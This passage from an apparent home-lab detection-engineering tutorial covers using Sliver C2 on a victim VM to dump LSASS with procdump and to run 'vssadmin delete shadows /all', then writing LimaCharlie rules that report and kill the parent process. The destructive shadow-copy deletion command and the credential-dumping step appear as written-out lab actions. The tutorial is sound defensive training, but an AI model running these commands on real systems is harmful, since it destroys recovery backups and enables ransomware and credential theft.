        - We’re telling **LimaCharlie** to simply generate a **detection report** anytime this detection occurs. For more advanced response capabilities, check out the docs. We could ultimately tell this rule to do all sorts of things (https://doc.limacharlie.io/docs/documentation/b43d922abb409-reference-actions), like terminate the offending process chain, etc. Let’s keep it simple for now.
        4. Now let’s test our rule against the event we built it for. Lucky for us, **LimaCharlie** carried over that event, it provides a quick and easy way to test the **D&R logic**:
            1. Click **Target Event** below the **D&R rule** you just wrote.
                1. Here you will see the **raw event** we observed in the timeline earlier.
            2. Scroll to the bottom of the **raw event** and click **Test Event** to see if our detection would work against this event.
                1. Notice that we have a **Match** and the **D&R engine** tells you exactly what it matched on.
            3. Scroll back up and click **Save Rule** and give it the name **LSASS Accessed** and be sure it is enabled.
</span>
</details>

<details>
<summary>
<h3>Step 3: Let’s Detect the Attack</h3>
</summary>
<span style="color:gray">

1. Return to your **Sliver server console**, back into your **C2 session**, and **rerun our same procdump command** from the beginning of this post.
    1. If at some point, your **C2 session dies**, just **relaunch your malware** with the steps in **Step 7**.
2. **After rerunning the procdump command**, go to the **Detections** tab on the **LimaCharlie** main left-side menu:
    1. On **Category** select **LSASS access** and select any event.
    2. You’ve just **detected a threat** with your own **detection signature!** Expand a detection to see the raw event.
    3. Notice, you can also go straight to the **timeline** where this event occurred by clicking **View Event Timeline** from the Detection entry.
</span>
</details>

<br>

## Volume Shadow Copies Deletion Using vssadmin

Volume Shadow Copies Deletion Using vssadmin is a cyberattack that involves deleting backup copies of files on a Windows system using the vssadmin tool, making it difficult for users to recover lost data. This attack can be used to cover tracks or hinder recovery efforts after a system compromise. The command `vssadmin delete shadows /all` is used in Ransomware attacks to delete the volume shadow copies, more information can be found [here](https://redcanary.com/blog/its-all-fun-and-games-until-ransomware-deletes-the-shadow-copies/):

<details>
<summary>
<h3>Step 1: Let’s Perform the Attack</h3>
</summary>
<span style="color:gray">

1. Get back onto an **SSH session on the Linux VM**, and drop into a **C2 session on your victim**:
    1. Retrace your steps from **Step 7** if need be.
    2. If you have issues re-establishing your **HTTP listener**, try rebooting your Ubuntu system.
2. In your **Sliver C2 shell** on the victim, run the basic command we’re looking to detect and block:
```
[server] sliver (payload_name) > shell
```
- When prompted with **This action is bad OPSEC, are you an adult?** type **Y** and hit enter.
3. In the new **System shell**, run the following command:
```
PS C:\Windows\system32> vssadmin delete shadows /all
```
- The output is not important as there may or not be **Volume Shadow Copies** available on the VM to be deleted, but running the command is sufficient to generate the telemetry we need.
4. Run the **whoami** command to verify we still have an **active system shell**:
```
PS C:\Windows\system32> whoami
```
</span>
</details>

<details>
<summary>
<h3>Step 2: Let’s Create the Detection Rule</h3>
</summary>
<span style="color:gray">

5. Browse over to **LimaCharlie’s Detections** tab to see if **default Sigma rules** picked up on our attack.
6. Click to expand the **detection** and examine all the **metadata** contained within the detection itself. One of the great things about **Sigma rules** is they are enriched with references to help you understand why the detection exists in the first place.
    1. One of the reference URLs contains a **YARA signature** (https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/gen_ransomware_command_lines.yar) written by **Florian Roth** that contains several more possible command lines that we’d want to consider in a very robust detection rule.
7. View the offending event in the **Timeline** to see the **raw event** that generated this detection.
8. Craft a **Detection & Response (D&R) rule** from this event.
9. From this **D&R rule template**, we can begin crafting our response action that will take place when this activity is observed:
    1. Add the following **Response rule** to the **Respond section**:
    ```
    - action: report
      name: vss_deletion_kill_it
    - action: task
      command:
        - deny_tree
        - <<routing/parent>>
    ```
    2. The **action: report** section simply fires off a **Detection report** to the **Detections** tab.
    3. The **action: task** (https://doc.limacharlie.io/docs/documentation/b43d922abb409-reference-actions#task) section is what is responsible for killing the parent process responsible with **deny_tree** (https://doc.limacharlie.io/docs/documentation/819e855933d6c-reference-commands#deny_tree) for the **vssadmin delete shadows /all command**.
10. Test the event and save your rule with the following name: **vss_deletion_kill_it**
</span>
</details>

<details>
<summary>
<h3>Step 3: Let’s Detect the Attack and Block It!</h3>
</summary>
<span style="color:gray">

1. Run the command to **delete volume shadows**:
```
PS C:\Windows\system32> vssadmin delete shadows /all
```
- The command should succeed, but the **action of running the command** is what will **trigger** our **D&R rule**.
2. Now, to test if our **D&R rule** properly terminated the parent process, **check to see if you still have an active system shell** by rerunning the **whoami** command:
```
PS C:\Windows\system32> whoami
```
- If our **D&R rule** worked successfully, the **system shell will (exit) hang and fail to return anything from the whoami** command, because the **parent process was terminated**.
- This is effective because in a **real ransomware scenario**, the parent process is likely the **ransomware payload** or **lateral movement tool** that would be terminated in this case.
3. **Terminate your (now dead) system shell** by pressing **Ctrl + D**.
</span>
</details>

</div>
